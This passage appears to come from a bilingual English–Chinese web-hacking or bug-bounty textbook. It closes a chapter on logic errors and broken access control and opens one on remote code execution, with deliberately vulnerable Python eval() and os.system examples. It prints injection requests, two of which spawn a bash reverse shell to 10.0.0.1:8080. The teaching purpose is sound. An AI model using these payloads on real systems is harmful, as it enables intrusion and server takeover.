对于您找到的新付款选项，完成付款所需的请求是什么？
任何请求参数是否指示付款类型或将收取多少费用？ 访问 /wp-admin/admin.php
的管理员门户时，是否发送任何特殊的HTTP标头或参数？
### Step 3: Think Outside the Box {#c17.xhtml#h2-501546c17-0005}
Finally, use your creativity to think of ways to bypass access control
or otherwise interfere with application logic. Play with the requests
that you have intercepted and craft requests that should not be granted.
If you modify the amount to be charged in a request parameter, will the
application still [ ]{#c17.xhtml#Page_281 .pagebreak title="281"}
process the transaction while charging you a lower amount? Can you
switch the payment type to a gift card even though you don't have one?
Can you access the admin page by adding a special cookie, such as
`      admin=1     ` ?
最后，利用你的创造力想出绕过访问控制或干扰应用逻辑的方法。玩弄你拦截到的请求，并创建本不该被授权的请求。例如，如果你修改请求中的金额参数，应用程序仍会处理该交易并向你收取更少的费用吗？即使没有礼品卡，你能否将支付类型切换为礼品卡？你能否通过添加特殊的
cookie（例如admin=1）访问管理员页面？
## Escalating the Attack {#c17.xhtml#h1-501546c17-0005}
Escalating application logic errors and broken access control depends
entirely on the nature of the flaw you find. But a general rule of thumb
is that you can try to combine the application logic error or broken
access control with other vulnerabilities to increase their impact.
不断升级的应用逻辑错误和破损的访问控制完全取决于您发现的缺陷性质。但是一个通常的经验法则是，您可以尝试将应用程序逻辑错误或破损的访问控制与其他漏洞相结合，以增加它们的影响力。
For example, a broken access control that gives you access to the admin
panel with a console or application deployment capabilities can lead to
remote code execution. If you can find the configuration files of a web
application, you can search for CVEs that pertain to the software
versions in use to further compromise the application. You might also
find credentials in a file that can be used to access different machines
on the network.
例如，破坏了访问控制的漏洞会使您通过控制台或应用程序部署功能访问管理员面板，从而导致远程代码执行。如果您可以找到
Web 应用程序的配置文件，则可以搜索适用于所使用软件版本的
CVE，以进一步破坏该应用程序。您还可以在文件中找到凭证，以用于访问网络上的不同计算机。
While the impact of a vulnerability like SQL injection or stored XSS is
often clear, it isn't always apparent what attackers can achieve with
application logic errors and broken access control vulnerabilities.
Think of ways malicious users can exploit these vulnerabilities to the
fullest extent, and communicate their impact in detail in your report.
虽然像SQL注入或存储的XSS这样的漏洞带来的影响往往是明显的，但攻击者利用应用逻辑错误和破损的访问控制漏洞所能达到的目的并不总是显然的。请考虑恶意用户如何充分利用这些漏洞，并在报告中详细描述它们的影响。
## Finding Your First Application Logic Error or Broken Access Control! {#c17.xhtml#h1-501546c17-0006}
Find your very first application logic error or broken access control
vulnerability by using the tips you learned in this chapter:
使用本章学到的技巧查找您的首个应用程序逻辑错误或破坏访问控制漏洞。
1.  Learn about your target application. The more you understand about
    the architecture and development process of the web application, the
    better you'll be at spotting these vulnerabilities.
2.  Intercept requests while browsing the site and pay attention to
    sensitive functionalities. Keep track of every request sent during
    these actions.
3.  Use your creativity to think of ways to bypass access control or
    otherwise interfere with application logic.
4.  Think of ways to combine the vulnerability you've found with other
    vulnerabilities to maximize the potential impact of the flaw.
5.  Draft your report! Be sure to communicate to the receiver of the
    report how the issue could be exploited by malicious users.
:::
[]{#c18.xhtml}
::: section
# [ [ ]{#c18.xhtml#Page_283 .pagebreak title="283"} 18 ]{.ChapterNumber} [ Remote Code Execution ]{.ChapterTitle} {.chapter}
![](image_fi/book_art/chapterart.png)
*Remote code execution (* *RCE)* occurs when an attacker can execute
arbitrary code on a target machine because of a vulnerability or
misconfiguration. RCEs are extremely dangerous, as attackers can often
ultimately compromise the web application or even the underlying web
server.
远程代码执行（RCE）是指由于漏洞或配置错误，攻击者能够在目标计算机上执行任意代码。
RCE非常危险，因为攻击者通常可以最终破坏Web应用程序甚至基础Web服务器。
There is no singular technique for achieving RCE. In previous chapters,
I noted that attackers can achieve it via SQL injection, insecure
deserialization, and template injection. In this chapter, we'll discuss
two more strategies that may allow you to execute code on a target
system: code injection and file inclusion vulnerabilities.
没有一种单一的技术可以实现RCE。在之前的章节中，我指出攻击者可以通过SQL注入、不安全的反序列化和模板注入来实现。在这一章中，我们将讨论另外两种策略，可能允许你在目标系统上执行代码：代码注入和文件包含漏洞。
Before we go on, keep in mind that developing RCE exploits often
requires a deeper understanding of programming, Linux commands, and web
application development. You can begin to work toward this once you get
the hang of finding simpler vulnerabilities.
在我们继续之前，请记住，开发RCE漏洞通常需要更深入的编程，Linux命令和Web应用程序开发的理解。一旦您掌握了查找更简单漏洞的方法，就可以开始朝着这个方向努力。
## [ ]{#c18.xhtml#Page_284 .pagebreak title="284"} Mechanisms {#c18.xhtml#h1-501546c18-0001}
Sometimes attackers can achieve RCE by injecting malicious code directly
into executed code. These are *code injection vulnerabilities* .
Attackers can also achieve RCE by putting malicious code into a file
executed or included by the victim application, vulnerabilities called
*file inclusions* .
有时攻击者可以通过将恶意代码直接注入执行代码来实现RCE。这些是代码注入漏洞。攻击者还可以通过将恶意代码放置在被受害应用程序执行或包含的文件中实现RCE，这些漏洞称为文件包含。
### Code Injection {#c18.xhtml#h2-501546c18-0001}
Code injection vulnerabilities happen when applications allow user input
to be confused with executable code. Sometimes this happens
unintentionally, when applications pass unsanitized data into executed
code; other times, this is built into the application as an intentional
feature.
当应用程序允许用户输入与可执行代码混淆时，就会发生代码注入漏洞。有时，当应用程序将未经过滤的数据传入执行的代码时，这种情况是无意的；而其他时候，这是应用程序中有意的一个功能。
For example, let's say you're a developer trying to build an online
calculator. Python's `      eval()     ` function accepts a string and
executes it as Python code: `      eval("1+1")     ` would return
`      2     ` , and `      eval("1*3")     ` would return
`      3     ` . Because of its flexibility in evaluating a wide variety
of user-submitted expressions, `      eval()     ` is a convenient way
of implementing your calculator. As a result, say you wrote the
following Python code to perform the functionality. This program will
take a user-input string, pass it through `      eval()     ` , and
return the results:
例如，假设你是一位开发者试图构建一个在线计算器。Python 的 eval()
函数接受一个字符串并将其作为 Python 代码执行：eval(\"1+1\") 会返回
2，eval(\"1\*3\") 会返回
3。由于其在评估各种用户提交的表达式方面的灵活性，eval()
是实现计算器的便捷方式。因此，假设你编写了以下 Python
代码来执行功能。此程序将接受用户输入的字符串，通过 eval()
进行传递，并返回结果。
    def calculate(input):
      return eval("{}".format(input))
    result = calculate(user_input.calc)
    print("The result is {}.".format(result))
Users can send operations to the calculator by using the following GET
request. When operating as expected, the following user input would
output the string `      The result is 3     ` :
用户可以通过以下GET请求向计算器发送操作。当操作按预期进行时，以下用户输入将输出字符串"结果为3："。
    GET /calculator?calc=1+2
    Host: example.com
But since `      eval()     ` in this case takes user-provided input and
executes it as Python code, an attacker could provide the application
with something more malicious instead. Remember Python's
`      os.system()     ` command from [ Chapter 16 ]{.xref
itemid="xref_target_Chapter 16"} , which executes its input string as a
system command? Imagine an attacker submitted the following HTTP request
to the `      calculate()     ` function:
但是，由于在这种情况下eval()接受用户提供的输入并将其作为Python代码执行，攻击者可能会提供更加恶意的内容给应用程序。还记得第16章中介绍的Python的os.system()命令吗？它会将其输入字符串作为系统命令执行。想象一下，如果攻击者向calculate()函数提交了以下HTTP请求：
    GET /calculator?calc="__import__('os').system('ls')"
    Host: example.com
As a result, the program would execute
`      eval("__import__('os').system('ls')")     ` and return the
results of the system command `      ls     ` . Since
`      eval()     ` can be used to execute arbitrary code on the system,
if you pass unsanitized user-input [ ]{#c18.xhtml#Page_285 .pagebreak
title="285"} into the `      eval()     ` function, you have introduced
a code injection vulnerability to your application.
因此，该程序将执行 eval(\"\_\_import\_\_(\'os\').system(\'ls\')\")
并返回系统命令 ls 的结果。由于 eval()
可以用于在系统上执行任意代码，如果将未经过滤的用户输入传递到 eval()
函数中，就会为应用程序引入代码注入漏洞。
The attacker could also do something far more damaging, like the
following. This input would cause the application to call
`      os.system()     ` and spawn a reverse shell back to the IP
10.0.0.1 on port 8080:
攻击者还可以进行更具破坏性的操作，比如以下内容。这个输入会导致应用程序调用os.system()函数，在端口8080上产生一个反向shell回到10.0.0.1的IP地址。
    GET /calculator?calc="__import__('os').system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')"
    Host: example.com
A *reverse shell* makes the target server communicate with the
attacker's machine and establish a remotely accessible connection
allowing attackers to execute system commands.
一个反向 shell
使目标服务器与攻击者的计算机通信并建立一个远程可访问的连接，使攻击者能够执行系统命令。
Another variant of code injection occurs when user input is concatenated
directly into a system command. This is also called a *command injection
vulnerability* . Aside from happening in web applications, command
injections are also incredibly prevalent in embedded web applications
because of their dependency on shell commands and frameworks using
wrappers that execute shell commands.
当用户输入直接连接到系统命令时，会发生另一种代码注入变体。这也被称为命令注入漏洞。除了在Web应用程序中发生外，命令注入在嵌入式Web应用程序中也非常普遍，因为它们依赖于Shell命令和使用执行Shell命令的包装器的框架。
Let's say *example.com* also has a functionality that allows you to
download a remote file and view it on the website. To achieve this
functionality, the application uses the system command `      wget     `
to download the remote file:
假设example.com也具有一个功能，允许您在网站上下载远程文件并查看。为了实现这个功能，应用程序使用系统命令wget来下载远程文件。
    import os
    def download(url):
      os.system("wget -O- {}".format(url))
    display(download(user_input.url))
The `      wget     ` command is a tool that downloads web pages given a
URL, and the `      -O-     ` option makes `      wget     ` download
the file and display it in standard output. Put together, this program
takes a URL from user input and passes it into the `      wget     `
command executed using `      os.system()     ` . For example, if you
submit the following request, the application would download the source
code of Google's home page and display it to you:
\"wget\" 命令是一个工具，可以通过给定 URL 下载网页。而 \"-O-\" 选项使
wget 下载文件并将其显示在标准输出中。综合起来，该程序将用户输入的 URL
传递给 os.system() 执行的 wget
命令。例如，如果您提交以下请求，应用程序将下载 Google
主页的源代码并将其显示给您：
    GET /download?url=google.com
    Host: example.com
Since the user input is passed into a system command directly, attackers
could inject system commands without even using a Python function.
That's because, on the Linux command line, the semicolon (
`      ;     ` ) character separates individual commands, so an attacker
could execute arbitrary commands after the `      wget     ` command by
submitting whatever command they want after a semicolon. For instance,
the following input would cause the application to spawn a reverse shell
back to the IP 10.0.0.1 on port 8080:
由于用户输入直接传递到系统命令中，攻击者甚至可以在不使用Python函数的情况下注入系统命令。这是因为，在Linux命令行上，分号（;）字符将单个命令分隔开，因此攻击者可以在分号后提交所需的任何命令，以执行任意命令。例如，以下输入将使应用程序在端口8080上向IP
10.0.0.1反向生成shell：
    GET /download?url="google.com;bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
    Host: example.com
### [ ]{#c18.xhtml#Page_286 .pagebreak title="286"} File Inclusion {#c18.xhtml#h2-501546c18-0002}
Most programming languages have functionality that allows developers to
*include* external files to evaluate the code contained within it. This
is useful when developers want to incorporate external asset files like
images into their applications, make use of external code libraries, or
reuse code that is written for a different purpose.
大多数编程语言都具有功能，允许开发人员包含外部文件以评估其中包含的代码。当开发人员希望将外部资产文件如图像合并到应用程序中，利用外部代码库或重用为不同目的编写的代码时，这非常有用。